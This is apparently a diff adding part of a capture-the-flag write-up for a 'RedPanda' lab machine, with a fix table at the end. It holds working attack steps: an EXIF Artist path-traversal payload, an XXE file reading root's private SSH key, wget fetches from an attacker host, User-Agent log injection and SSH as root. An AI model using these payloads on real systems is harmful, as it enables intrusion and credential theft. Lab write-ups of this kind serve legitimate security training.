+    <h3 class="sub">1. The JPG — traversal in the Artist tag</h3>
+    <p>Any JPG works. The pixels don't matter, only the metadata:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — attacker</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>exiftool -Artist=<span class="st">'../home/woodenk/root'</span> root.jpg
+exiftool root.jpg | grep Artist
+<span class="cm"># Artist : ../home/woodenk/root</span></pre>
+    </div>
+    <p>Why not just drop our XML into <code>/credits/</code>? Because we can't — the directory belongs to root and isn't writable for <code>woodenk</code>. The program will only ever open <code>/credits/&lt;artist&gt;_creds.xml</code>, but we choose the artist. So the Artist tag walks the path out of <code>/credits</code> and into a directory we own:</p>
+    <p><code>/credits/</code> + <code>../home/woodenk/root</code> + <code>_creds.xml</code> = <code>/home/woodenk/root_creds.xml</code>. Root will go looking for the XML in our home directory.</p>
+
+    <h3 class="sub">2. The XML — external entity</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">xml — root_creds.xml</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>&lt;?xml version=<span class="st">"1.0"</span> encoding=<span class="st">"UTF-8"</span>?&gt;
+<span class="rd">&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM "file:///root/.ssh/id_rsa"&gt;]&gt;</span>
+&lt;credits&gt;
+  &lt;author&gt;damian&lt;/author&gt;
+  &lt;image&gt;
+    &lt;uri&gt;/../../../../../../home/woodenk/root.jpg&lt;/uri&gt;
+    &lt;uwu&gt;<span class="rd">&amp;example;</span>&lt;/uwu&gt;
+    &lt;views&gt;0&lt;/views&gt;
+  &lt;/image&gt;
+  &lt;totalviews&gt;0&lt;/totalviews&gt;
+&lt;/credits&gt;</pre>
+    </div>
+    <p>The structure mirrors the real credits files — the <code>&lt;uri&gt;</code> has to match exactly so the view counter logic runs and the file gets written back. The extra <code>&lt;uwu&gt;</code> element is where root's private key will appear.</p>
+
+    <h3 class="sub">3. Drop both files on the box</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — reverse shell</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:~$ wget 10.10.15.118:8000/root.jpg
+woodenk@redpanda:~$ wget 10.10.15.118:8000/root_creds.xml</pre>
+    </div>
+
+    <h3 class="sub">4. Poison the log through User-Agent</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>curl -s -o /dev/null http://10.129.99.184:8080/stats \
+     -A <span class="st">'||/../../../../../../home/woodenk/root.jpg'</span></pre>
+    </div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — redpanda.log</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:~$ cat /opt/panda_search/redpanda.log
+200||10.129.99.184||<span class="cm">&lt;empty UA&gt;</span>||<span class="rd">/../../../../../../home/woodenk/root.jpg</span>||/stats</pre>
+    </div>
+    <p>Our <code>||</code> pushed the real URI into slot 4, and slot 3 is now our path. The line contains <code>.jpg</code>, so <code>isImage()</code> waves it through.</p>
+
+    <h3 class="sub">5. Wait for cron</h3>
+    <p>The job runs every two minutes. Then:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:~$ cat root_creds.xml
+&lt;?xml version=<span class="st">"1.0"</span> encoding=<span class="st">"UTF-8"</span>?&gt;
+&lt;!DOCTYPE foo&gt;
+&lt;credits&gt;
+  &lt;author&gt;damian&lt;/author&gt;
+  &lt;image&gt;
+    &lt;uri&gt;/../../../../../../home/woodenk/root.jpg&lt;/uri&gt;
+    &lt;uwu&gt;<span class="st">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+...
+-----END OPENSSH PRIVATE KEY-----</span>&lt;/uwu&gt;
+    &lt;views&gt;<span class="nu">1</span>&lt;/views&gt;
+  &lt;/image&gt;
+  &lt;totalviews&gt;<span class="nu">1</span>&lt;/totalviews&gt;
+&lt;/credits&gt;</pre>
+    </div>
+    <p>One view counted, one private key delivered. Root was nice enough to update the panda statistics while handing it over.</p>
+
+    <h3 class="sub">6. SSH as root</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — attacker</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>❯ chmod 600 root_key
+❯ ssh -i root_key root@10.129.99.184
+root@redpanda:~# cat /root/root.txt
+<span class="st">db02d0a8************************</span></pre>
+    </div>
+    <p>Root. Four broken assumptions in one cron job.</p>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- CREDS SUMMARY -->
+  <div class="section">
+    <div class="section-num">Summary</div>
+    <h2>Credentials</h2>
+    <table class="creds-table">
+      <thead><tr><th>User</th><th>Password / Method</th><th>Source</th></tr></thead>
+      <tbody>
+        <tr><td>woodenk (shell)</td><td>SSTI → Runtime.exec()</td><td>/search, *{...} SpEL</td></tr>
+        <tr><td>woodenk (SSH)</td><td>RedPanda*****</td><td>MainController.java</td></tr>
+        <tr><td>root</td><td>id_rsa</td><td>LogParser traversal + XXE</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- FAILURE ANALYSIS -->
+  <div class="section">
+    <div class="section-num">// failure analysis</div>
+    <h2>What Broke and Why</h2>
+    <table class="vuln-table">
+      <thead>
+        <tr><th>Vector</th><th>Root Cause</th><th>Fix</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>SSTI in /search</td>
+          <td>User input concatenated into a Thymeleaf template; "fixed" by blacklisting <code>$ _ ~</code> while <code>*{}</code> and <code>#{}</code> stayed open</td>
+          <td>Pass input as a model attribute, never as template source; drop the blacklist</td>
+        </tr>
+        <tr>
+          <td>Hardcoded DB credentials</td>
+          <td>Plaintext password in source, reused for the system account</td>
+          <td>Externalized secrets; separate DB and OS credentials</td>
+        </tr>
+        <tr>
+          <td>Log field injection</td>
+          <td>Log format uses <code>||</code> as separator but the User-Agent isn't escaped</td>
+          <td>Structured logging (JSON) or escape the delimiter on write</td>
+        </tr>
+        <tr>
+          <td>Path traversal ×2</td>
+          <td>URI from logs and EXIF Artist tag concatenated into file paths and read as root</td>
+          <td>Canonicalize the path and verify it stays under the base directory; allowlist artist names</td>
+        </tr>
+        <tr>
+          <td>XXE</td>
+          <td><code>SAXBuilder</code> with default settings resolves external entities</td>
+          <td>Disallow DOCTYPE (<code>disallow-doctype-decl</code>) / <code>setExpandEntities(false)</code></td>
+        </tr>
+        <tr>
+          <td>Root cron job</td>
+          <td>A log-processing task with no need for root runs as root</td>
+          <td>Run it as a dedicated low-privilege user</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <footer>
+    <span class="footer-brand">cybermaksx.com</span>
+    <div class="footer-links">
+      <a href="https://github.com/cybermaksx" target="_blank">GitHub</a>
+      <a href="https://linkedin.com" target="_blank">LinkedIn</a>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+  function copyCode(btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    navigator.clipboard.writeText(pre.innerText).then(() => {
+      btn.textContent = 'copied';
+      setTimeout(() => btn.textContent = 'copy', 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
